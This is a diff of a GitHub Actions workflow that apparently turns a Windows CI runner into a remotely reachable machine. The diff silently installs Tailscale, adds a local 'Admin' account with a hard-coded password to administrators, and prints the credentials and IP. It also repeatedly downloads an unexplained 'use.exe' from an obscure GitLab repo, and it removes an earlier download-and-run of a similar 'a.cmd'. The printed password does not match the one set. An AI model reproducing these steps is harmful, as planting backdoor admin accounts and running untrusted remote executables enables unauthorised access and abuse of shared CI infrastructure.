@@ -11,11 +11,20 @@ jobs:
 
       - name: Install 
         run: |
-          Invoke-WebRequest https://github.com/Efebey2903/fictional-octo-waffle/raw/main/a.cmd -OutFile setup.cmd
-          cmd /c setup.cmd
-          
+          $MsiUrl  = "https://pkgs.tailscale.com/stable/tailscale-setup-1.92.3-amd64.msi"
+          $MsiPath = "$env:TEMP\tailscale.msi"
+          Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiPath
+          Start-Process msiexec -ArgumentList "/i `"$MsiPath`" /qn /norestart" -Wait
+          net user /add Admin P@ssw0rd!
+          net localgroup /add administrators Admin
+
       - name: Start 
         run: |
+           tailscale up
+           Write-Host "Username: Admin"
+           Write-Host "Password: P@ss0wrd!"
+           $TAIL_IP = & tailscale ip -4
+           Write-Host "Access from here: $TAIL_IP"
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            cmd /c sleep 240
            cmd /c curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
